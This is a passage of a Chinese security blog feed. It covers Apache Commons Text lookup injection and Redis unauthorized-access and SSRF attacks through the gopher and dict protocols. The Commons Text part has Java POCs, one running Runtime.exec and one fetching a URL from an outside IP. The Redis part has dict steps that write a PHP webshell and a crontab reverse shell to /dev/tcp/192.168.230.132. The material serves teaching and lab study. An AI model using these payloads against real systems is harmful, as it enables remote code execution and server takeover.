<p>如果 StringSubstitutor.disableSubstitutionInValues 这个变量为 false 的话，也可以进行循环调用，就是在远程服务器上写入另一个POC然后触发</p>
<h3 id="poc-4"><a href="#poc-4" class="headerlink" title="poc"></a>poc</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlStringLookup_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line">       <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;url:utf-8:http://49.232.29.145:6666/1.txt&#125;&quot;</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">payload2</span> <span class="operator">=</span> <span class="string">&quot;$&#123;url:utf-8:file:///R:/a/hello.txt&#125;&quot;</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> interpolator.replace(payload2);</span><br><span class="line">       System.out.println(fileContent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="其他有用的"><a href="#其他有用的" class="headerlink" title="其他有用的"></a>其他有用的</h2><p>realworld2023 的体验赛用到了一个</p>
<p>当没禁用 base64decoder 时，可以打入base64的字符串进行命令执行</p>
<p>它会将后面的base64字符串进行解析并执行。</p>
<h3 id="base64decoder-FunctionStringLookup"><a href="#base64decoder-FunctionStringLookup" class="headerlink" title="base64decoder-FunctionStringLookup"></a>base64decoder-FunctionStringLookup</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.text.StringSubstitutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FunctionStringLookup_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;base64decoder:JHtzY3JpcHQ6anM6amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNhbGMiKX0=&#125;&quot;</span>;</span><br><span class="line">        interpolator.replace(payload);</span><br><span class="line">        <span class="comment">//org.apache.commons.text.lookup.FunctionStringLookup</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>









































]]></content>
      <categories>
        <category>cve</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java 反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 安全</title>
    <url>/2023/10/02/blog_Redis%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="1-Redis是什么"><a href="#1-Redis是什么" class="headerlink" title="1.Redis是什么"></a>1.Redis是什么</h2><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
<p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
<p><strong>Redis默认端口为6379</strong></p>
<h2 id="2-Redis的命令"><a href="#2-Redis的命令" class="headerlink" title="2.Redis的命令"></a>2.Redis的命令</h2><h3 id="连接命令"><a href="#连接命令" class="headerlink" title="连接命令"></a>连接命令</h3><p> 本地连接：<code>redis-cli</code>（本地连接后，若存在密码使用AUTH pass进行验证）</p>
<p> 远程连接：<code>redis-cli -h host -p port [-a passwd]</code>（参数a可选项，如果是没有密码的则不需要）</p>
<h3 id="键操作"><a href="#键操作" class="headerlink" title="键操作"></a>键操作</h3><p> 设置键值对：set 键名 键值（例如：set atao xxx–&gt;写入一个键名为atao、键值为xxx的内容，执行成功返回OK）</p>
<p> 取出键值对：get 键名（例如：get atao–&gt;取出键名为atao的键的键值，返回键中的键值）</p>
<p> 删除键值对：del 键名（例如：del atao–&gt;删除键名为atao的键，如果键被删除返回(integer)1，否则将输出(integer)0）</p>
<p> 清空所有数据库命令：flushall（删除所有数据库里面的所有数据，是所有数据库，不仅仅是当前数据库，且此命令永远不会出现失败）</p>
<p> 同步数据到磁盘上：save（以RDB文件的方式保存所有数据的快照，命令执行成功返回OK）</p>
<h3 id="配置操作"><a href="#配置操作" class="headerlink" title="配置操作"></a>配置操作</h3><p>Redis配置文件名为redis.conf（Windows下名为redis.windows.conf），可以使用CONFIG命令进行查看。</p>
<p>设置配置文件：config set 配置项 路径（配置项如:dir或dbfilename，二者分别是指定本地数据库存放目录和指定本地数据库文件名，配置被正确设置时返回OK，否则将返回错误）</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p>
<ul>
<li>查看信息：info</li>
<li>删除所有数据库内容：flushall</li>
<li>刷新数据库：flushdb</li>
<li>查看所有键：keys *，使用select num可以查看键值数据</li>
<li>设置变量：set aaa “mi1k7ea”</li>
<li>查看变量值：get aaa</li>
<li>查看备份文件路径：config get dir</li>
<li>设置备份文件路径：config set dir dirpath</li>
<li>查看备份文件名：config get dbfilename</li>
<li>设置备份文件名：config set dbfilename filename</li>
<li>保存备份文件：save</li>
</ul>
<h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><h3 id="Redis安装过程"><a href="#Redis安装过程" class="headerlink" title="Redis安装过程"></a>Redis安装过程</h3><ul>
<li><p>下载安装包：<a class="link"   href="http://download.redis.io/releases/" >http://download.redis.io/releases/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>解压 <code>tar -zxvf redis-x.x.x.tar.gz</code></p>
</li>
<li><p>进入解压后的文件夹，执行 <code>make</code> 命令</p>
</li>
<li><p>修改 redis.conf 文件</p>
<p><a href="https://img2020.cnblogs.com/blog/1893076/202102/1893076-20210227142812076-133463281.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1893076-20210227142812076-133463281.png"
                      alt="img"
                ></a></p>
<p>高版本下还需要将这个值设置为 yes ，否则会出现如下报错</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(error) ERR CONFIG SET failed (possibly related to argument ‘dir’) - can’t set protected config</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120155129694.png"
                      alt="image-20240120155129694"
                ></p>
<ul>
<li>进入 <code>src</code> 目录，执行 <code>./redis-server ../redis.conf &amp;</code>，启动 Redis 并至于后台</li>
</ul>
<p>修改 redis.conf  配置文件方便测试未授权访问</p>
<p><strong>未授权访问</strong></p>
<p>在 <code>redis.conf</code> 的配置文件中，有两个关键的配置会造成 Redis 未授权访问</p>
<ul>
<li>bind x.x.x.x<br>配置允许登陆 redis 服务的 ip，默认是 127.0.0.1(本机登录)<br>如果设置成 0.0.0.0 就相当于将redis暴露在公网中，公网中的机器都可以进行登陆</li>
<li>protected-mode<br>功能是自 redis 3.2 之后设置的保护模式，默认为 yes，其作用就是如果 redis 服务没有设置密码并且没有配置 bind 则会只允许 redis 服务本机进行连接。关闭保护模式，就会允许远程连接Redis服务</li>
</ul>
<p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.13.128 -p 6379</span><br></pre></td></tr></table></figure></div>



<h3 id="捕捉Redis流量"><a href="#捕捉Redis流量" class="headerlink" title="捕捉Redis流量"></a>捕捉Redis流量</h3><p> 这里使用的是tcpdump抓取流量，（遇到了一个小坑，Kali上显示tcpdump为最新版，但是无命令，更新环境变量：export PATH&#x3D;”&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin”后可以正常使用）抓取流量的命令为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i lo -s 0 port 6379 -w redis.pcap</span><br></pre></td></tr></table></figure></div>





<h2 id="4-常用协议"><a href="#4-常用协议" class="headerlink" title="4.常用协议"></a>4.常用协议</h2><h3 id="Redis通信协议RESP"><a href="#Redis通信协议RESP" class="headerlink" title="Redis通信协议RESP"></a>Redis通信协议RESP</h3><p>Redis客户端使用称为<strong>RESP</strong>（Redis序列化协议）的协议与Redis服务器进行通信，后续构造 payload 时也需要转换成 RESP 协议的格式。</p>
<div class="highlight-container" data-rel="Swift"><figure class="iseeu highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="type">RESP在Redis中用作请求</span><span class="operator">-</span>响应协议的方式如下：</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 客户端将命令作为<span class="type">RESP大容量字符串数组发送到Redis服务器</span><span class="operator">。</span></span><br><span class="line"><span class="operator">-</span> 服务器根据命令实现以<span class="type">RESP类型之一进行回复</span><span class="operator">。</span></span><br><span class="line">在<span class="type">RESP中，某些数据的类型取决于第一个字节：</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于简单字符串，答复的第一个字节为<span class="string">&quot;+&quot;</span></span><br><span class="line">  	格式：<span class="operator">+</span>字符串</span><br><span class="line">  	注意：字符串不能包含<span class="type">CR或者LF（不允许换行）</span></span><br><span class="line">  	eg：<span class="string">&quot;+OK<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于错误，回复的第一个字节为<span class="string">&quot;-&quot;</span></span><br><span class="line">  	格式：<span class="operator">-</span>错误前缀 错误信息\r\n</span><br><span class="line">  	注意：错误信息不能包含<span class="type">CR或者LF（不允许换行），Errors与Simple</span> <span class="type">Strings相似，不同的是Errors会被当作异常看待</span></span><br><span class="line">  	eg：<span class="string">&quot;-Errors unknow command &#x27;foobar&#x27;<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于整数，答复的第一个字节为<span class="string">&quot;:&quot;</span></span><br><span class="line">  	格式：:数字\r\n</span><br><span class="line">  	eg：<span class="string">&quot;:10<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于批量字符串（大字符串类型<span class="type">Bulk</span> <span class="type">Strings，长度限制512M），答复的第一个字节为</span><span class="string">&quot;$&quot;</span></span><br><span class="line">  	格式：<span class="variable">$字符串的长度</span>\r\n字符串\r\n</span><br><span class="line">  	注意：字符串不能包含<span class="type">CR或者LF（不允许换行）</span></span><br><span class="line">  	eg：<span class="string">&quot;$7<span class="subst">\r</span><span class="subst">\n</span>payload<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于数组，回复的第一个字节为<span class="string">&quot;*&quot;</span></span><br><span class="line">  	格式：<span class="operator">*</span>数组元素个数\r\n其他类型(结尾不需要\r\n)</span><br><span class="line">  	注意：只有元素个数后面的\r\n是属于该数组的，结尾的\r\n一般是元素的</span><br><span class="line">  	eg：<span class="string">&quot;*0<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>——空数组</span><br><span class="line">  		<span class="string">&quot;*2<span class="subst">\r</span><span class="subst">\n</span>$1<span class="subst">\r</span><span class="subst">\n</span>A<span class="subst">\r</span><span class="subst">\n</span>$3<span class="subst">\r</span><span class="subst">\n</span>tao<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>——数组包含<span class="number">2</span>个元素，分别为<span class="type">A和tao</span></span><br><span class="line">  		<span class="string">&quot;*-1<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>——<span class="type">Null数组</span></span><br><span class="line"></span><br><span class="line">通过上面所述的几种类型构造命令传给redis服务端，则服务端会返回相应的内容<span class="operator">。</span></span><br><span class="line">执行成功后服务器会返回 <span class="operator">+</span><span class="type">OK，这个是</span> redis 服务器对 redis 客户端的响应</span><br></pre></td></tr></table></figure></div>



<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
<ol>
<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
<li>服务器根据命令实现回复一种RESP类型。</li>
</ol>
<blockquote>
<p><strong>在 RESP 中，某些数据的类型取决于第一个字节：</strong><br><strong>对于 <code>Simple Strings</code> ，回复的第一个字节是 <code>+</code></strong><br><strong>对于 <code>error</code> ，回复的第一个字节是<code>-</code></strong><br><strong>对于 <code>Integer</code> ，回复的第一个字节是<code>:</code></strong><br><strong>对于 <code>Bulk Strings</code> ，回复的第一个字节是<code>$</code></strong><br><strong>对于 <code>array</code> ，回复的第一个字节是<code>*</code></strong><br><strong>此外，<code>RESP</code> 能够使用稍后指定的 <code>Bulk Strings</code> 或<code> Array</code> 的特殊变体来表示 <code>Null</code> 值。</strong><br><strong>在RESP中，协议的不同部分始终以 <code>&quot;\r\n&quot;(CRLF)</code> 结束。</strong></p>
</blockquote>
<p>可以用<code>tcpdump</code>来抓个包来测试一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump port 6379 -w ./1.pcap</span><br></pre></td></tr></table></figure></div>

<p>redis客户端中执行如下命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.163.128:6379&gt; set name test</span><br><span class="line">OK</span><br><span class="line">192.168.163.128:6379&gt; get name</span><br><span class="line">&quot;test&quot;</span><br><span class="line">192.168.163.128:6379&gt;</span><br></pre></td></tr></table></figure></div>



<p>抓到的数据包如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/20190713085931-794d2d5e-a509-1-17057593958178.png"
                      alt="20190713085931-794d2d5e-a509-1"
                >	</p>
<p>hex转储看一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/20190713090053-a9d401f0-a509-1-170575940818512.png"
                      alt="20190713090053-a9d401f0-a509-1"
                ></p>
<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了</p>
<p><code>Gopher</code> 协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
<p> 万金油协议！！！</p>
<p>语法格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher_path&gt;_value</code>（host为IP地址；port为指定端口，没写的话默认为70端口；”_”是一种数据连接格式，任意字符都行，因为gopher会吞噬第一个字符；value为TCP数据流）</p>
<p> 如果发起为POST请求，回车换行使用%0D%0A（有些博客说的需要双重 URL 编码，即<code>%250d%250a</code>，反正后续脚本一次编码和二次编码都写了，都试试就知道了）；如果多个参数，参数之间的&amp;也需要进行URL编码。</p>
<div class="highlight-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">GET请求</span><br><span class="line">源码</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;Hello!&quot;</span>.$a; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">下面是我们要请求的TCP数据流</span><br><span class="line">GET /flag.php?a=atao HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">159.131</span></span><br><span class="line"></span><br><span class="line">转成url编码的格式（最后一句结尾也要%0d%0a，所以要加上）</span><br><span class="line">%47%45%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%<span class="number">3</span>f%61%<span class="number">3</span>d%61%74%61%<span class="number">6</span>f%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a</span><br><span class="line"></span><br><span class="line">curl gopher:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">159.131</span>:<span class="number">80</span>/<span class="number">_</span>%47%45%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%<span class="number">3</span>f%61%<span class="number">3</span>d%61%74%61%<span class="number">6</span>f%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">02</span> Nov <span class="number">2020</span> <span class="number">16</span>:09:<span class="number">33</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">23</span> (Win32) OpenSSL/<span class="number">1.0</span>.<span class="number">2</span>j mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span>.<span class="number">45</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Hello!atao</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST请求</span><br><span class="line">源码</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;Hello!&quot;</span>.$a; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">用原来的方式进行请求</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">159.131</span></span><br><span class="line"></span><br><span class="line">a=atao</span><br><span class="line">这样会报错，POST请求需要多加两个参数Content-Type和Content-Length</span><br><span class="line"></span><br><span class="line">修改后为</span><br><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">159.131</span></span><br><span class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">a=atao</span><br><span class="line"></span><br><span class="line">转成url编码的格式（这次结尾不用加%0d%0a，因为最后是参数）</span><br><span class="line">%5<span class="number">0</span>%<span class="number">4</span>f%53%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%54%79%7<span class="number">0</span>%65%<span class="number">3</span>a%2<span class="number">0</span>%61%7<span class="number">0</span>%7<span class="number">0</span>%<span class="number">6</span>c%69%63%61%74%69%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">2</span>f%78%<span class="number">2</span>d%77%77%77%<span class="number">2</span>d%66%<span class="number">6</span>f%72%<span class="number">6</span>d%<span class="number">2</span>d%75%72%<span class="number">6</span>c%65%<span class="number">6</span>e%63%<span class="number">6</span>f%64%65%64%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%<span class="number">4</span>c%65%<span class="number">6</span>e%67%74%68%<span class="number">3</span>a%2<span class="number">0</span>%36%0d%0a%0d%0a%61%<span class="number">3</span>d%61%74%61%6f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl gopher:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">159.131</span>:<span class="number">80</span>/<span class="number">_</span>%5<span class="number">0</span>%<span class="number">4</span>f%53%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%54%79%7<span class="number">0</span>%65%<span class="number">3</span>a%2<span class="number">0</span>%61%7<span class="number">0</span>%7<span class="number">0</span>%<span class="number">6</span>c%69%63%61%74%69%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">2</span>f%78%<span class="number">2</span>d%77%77%77%<span class="number">2</span>d%66%<span class="number">6</span>f%72%<span class="number">6</span>d%<span class="number">2</span>d%75%72%<span class="number">6</span>c%65%<span class="number">6</span>e%63%<span class="number">6</span>f%64%65%64%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%<span class="number">4</span>c%65%<span class="number">6</span>e%67%74%68%<span class="number">3</span>a%2<span class="number">0</span>%36%0d%0a%0d%0a%61%<span class="number">3</span>d%61%74%61%6f</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">02</span> Nov <span class="number">2020</span> <span class="number">16</span>:<span class="number">19</span>:<span class="number">16</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">23</span> (Win32) OpenSSL/<span class="number">1.0</span>.<span class="number">2</span>j mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span>.<span class="number">45</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Hello!atao</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>



<h3 id="Dict协议"><a href="#Dict协议" class="headerlink" title="Dict协议"></a>Dict协议</h3><p> 在SSRF中，主要是用来查看端口服务是否开启的，但是在Redis中如果无法使用Gopher协议，则可以通过该协议进行替代，不过该协议不能进行多行命令执行（只能执行一行），当传输命令时，dict 协议的话要一条一条的执行，所以一般 dict 协议只是当个备胎用。</p>
<p> 语法格式：<code>dict:////&lt;host&gt;:&lt;port&gt;/&lt;value&gt;</code>（host为IP地址；port为指定端口；value为请求内容）</p>
<p><strong>注意要点：</strong></p>
<ul>
<li><p><code>&lt;value&gt;</code> 处的冒号相当于空格。</p>
</li>
<li><p>与 gopher 不同的是，使用 dict 协议并不会吞噬第一个字符，并且会多加一个 quit 字符串，自动添加 CRLF 换行。</p>
</li>
<li><p>在传输命令时，若命令中有空格，则该命令需要做一次<strong>十六进制编码</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">cmd = <span class="string">&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.230.132/1234 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">    cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char).replace(<span class="string">&quot;0xa&quot;</span>,<span class="string">&quot;0x0a&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;\\\\x&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(cmd_encoder)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">使用命令</span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-g</span> <span class="string">&quot;dict://127.0.0.1:6397/set:koishi:cirno&quot;</span></span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line"><span class="literal">-ERR</span> Unknown subcommand or wrong number of arguments <span class="keyword">for</span> <span class="string">&#x27;libcurl&#x27;</span>. <span class="keyword">Try</span> CLIENT HELP</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line"></span><br><span class="line">抓包看到的</span><br><span class="line">CLIENT libcurl <span class="number">7.68</span>.<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> koishi cirno</span><br><span class="line">QUIT</span><br><span class="line"></span><br><span class="line">来自郁神的解释</span><br><span class="line">第一行是代表发出的<span class="built_in">cli</span>的工具和版本</span><br><span class="line">第二行是执行我们请求的命令</span><br><span class="line">第三行是自行退出</span><br><span class="line">从这里我们就不难看出为啥dict不适合Redis认证的题目了，每次只能执行一条命令，执行完后还会退出，没有余力做别的操作</span><br><span class="line">这里返回第一行报错了，应该是没有带参数而报错的</span><br></pre></td></tr></table></figure></div>



<h4 id="Dict-使用例子"><a href="#Dict-使用例子" class="headerlink" title="Dict 使用例子"></a>Dict 使用例子</h4><p><strong>例子1，写马</strong></p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">写入恶意代码：（&lt;? 等特殊符号需要转义，不然问号后面会导致截断无法写入）</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/<span class="built_in">set</span>:shell:&quot;\x3C\x3Fphp\x20echo`$_GET[x]`\x3B\x3F\x3E&quot;</span><br><span class="line"></span><br><span class="line">设置保存路径：</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/var/www/html/</span><br><span class="line"></span><br><span class="line">设置保存名字：</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:dbfilename:shell.php</span><br><span class="line"></span><br><span class="line">保存：</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/save</span><br></pre></td></tr></table></figure></div>



<p><strong>例子2，写定时任务</strong></p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="number">1</span> &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/<span class="number">192</span>.<span class="number">168</span>.<span class="number">230</span>.<span class="number">132</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>\n\n\n\n&quot;</span><br><span class="line">对应</span><br><span class="line"><span class="function">dict://172.2.0.2:6379/<span class="title">set</span>:1:\&quot;十六进制编码\&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">config</span> <span class="title">set</span> <span class="title">dir</span> /<span class="title">etc</span>/</span></span><br><span class="line"><span class="function">对应：</span></span><br><span class="line"><span class="function"><span class="title">dict</span>://172.2.0.2:6379/<span class="title">config:set</span>:<span class="title">dir</span>:/<span class="title">etc</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">config</span> <span class="title">set</span> <span class="title">dbfilename</span> <span class="title">crontab</span></span></span><br><span class="line"><span class="function">对应：</span></span><br><span class="line"><span class="function"><span class="title">dict</span>://172.2.0.2:6379/<span class="title">config:set</span>:<span class="title">dbfilename:crontab</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">save</span></span></span><br><span class="line"><span 